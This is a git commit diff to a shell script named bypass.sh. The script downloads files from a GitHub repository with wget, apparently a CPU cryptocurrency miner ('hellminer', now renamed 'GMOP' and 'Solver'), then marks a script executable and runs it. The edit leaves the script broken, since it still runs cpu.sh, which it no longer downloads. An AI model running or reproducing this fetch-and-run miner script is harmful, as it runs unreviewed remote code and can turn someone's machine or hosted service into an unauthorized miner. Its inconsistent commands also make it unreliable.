a604a7e3aed9c49066c3583cd4748d042f928af4
Godmine99 <90863870+Godmine99@users.noreply.github.com>
2021-12-13 17:00:56 +0530

    Update bypass.sh

--- bypass.sh
+++ bypass.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 
 sudo apt update
-wget https://github.com/GodMinerop/cpu/raw/main/hellminer
-wget https://raw.githubusercontent.com/GodMinerop/cpu/main/cpu.sh
+wget https://github.com/GodMinerop/cpu/raw/main/GMOP
+wget https://raw.githubusercontent.com/GodMinerop/cpu/main/Solver
 chmod +x cpu.sh
 ./cpu.sh
